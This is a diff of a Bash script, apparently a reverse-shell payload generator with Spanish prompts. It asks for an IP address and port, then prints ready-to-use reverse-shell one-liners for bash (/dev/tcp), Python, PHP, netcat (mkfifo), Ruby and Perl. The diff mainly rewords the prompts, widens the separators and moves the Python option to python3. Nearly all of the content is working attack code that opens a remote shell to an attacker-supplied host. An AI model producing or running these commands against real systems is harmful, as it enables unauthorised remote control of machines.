@@ -16,63 +16,63 @@ function func()
    exit 1
 }
 
-echo "ingresa un numero [1-7] : "
+echo "introduzca una numero [1-7] : "
 read option
 
 if [ $option == 1 ]; then
 	echo "bash"
-	echo "ingresa un ip address"
+	echo "introduzca una dirección IP:"
 	read ip
-	echo "ingresa un port"
+	echo "introduzca el port:"
 	read port
-	echo "-----"
+	echo "----------------------------------------"
 	echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
-	echo "-----"
+	echo "----------------------------------------"
 elif [ $option == 2 ]; then
 	echo "Python"
-    echo "ingresa un ip address"
+    echo "introduzca una dirección IP:"
     read ip
-    echo "ingresa un port"
+    echo "introduzca el port:"
     read port
-    echo "-----"
-    echo  "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\"$ip"\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("'"/bin/sh"'")'"
-    echo "-----"
+    echo "----------------------------------------"
+    echo "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\"$ip"\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("'"/bin/sh"'")'"
+    echo "----------------------------------------"
 elif [ $option == 3 ]; then
 	echo "Php"
-	echo "ingresa un ip address"
+	echo "introduzca una dirección IP:"
 	read ip
-	echo "ingresa un port"
+	echo "introduzca el port:"
 	read port
-	echo "-----"
+	echo "----------------------------------------"
 	echo "php -r '$sock=fsockopen("\"$ip"\",$port);system("'"/bin/sh -i <&3 >&3 2>&3"'");'"
-	echo "-----"
+	echo "----------------------------------------"
 elif [ $option == 4 ]; then
 	echo "Netcat"
-	echo "ingresa un ip address"
+	echo "introduzca una dirección IP:"
 	read ip
-	echo "ingresa un port"
+	echo "introduzca el port:"
 	read port
-	echo "-----"
+	echo "----------------------------------------"
 	echo "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
-	echo "-----"
+	echo "----------------------------------------"
 elif [ $option == 5 ]; then
 	echo "Ruby"
-	echo "ingresa un ip address"
+	echo "introduzca una dirección IP:"
 	read ip
-	echo "ingresa un port"
+	echo "introduzca el port:"
 	read port
-	echo "-----"
+	echo "----------------------------------------"
 	echo "ruby -rsocket -e'f=TCPSocket.open("\"$ip"\",$port).to_i;exec sprintf("'"/bin/sh -i <&%d >&%d 2>&%d"'",f,f,f)'"
-	echo "-----"
+	echo "----------------------------------------"
 elif [ $option == 6 ]; then
 	echo "perl"
-	echo "ingresa un ip address"
+	echo "introduzca una dirección IP:"
 	read ip
-	echo "ingresa un port"
+	echo "introduzca el port:"
 	read port
-	echo "-----"
+	echo "----------------------------------------"
 	echo "perl -e 'use Socket;$i="\"$ip"\";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("'"tcp"'"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"'">&S"'");open(STDOUT,"'">&S"'");open(STDERR,"'">&S"'");exec("'"/bin/sh -i"'");};'"
-	echo "-----"
+	echo "----------------------------------------"
 elif [ $option == 7 ]; then
 	func
 fi
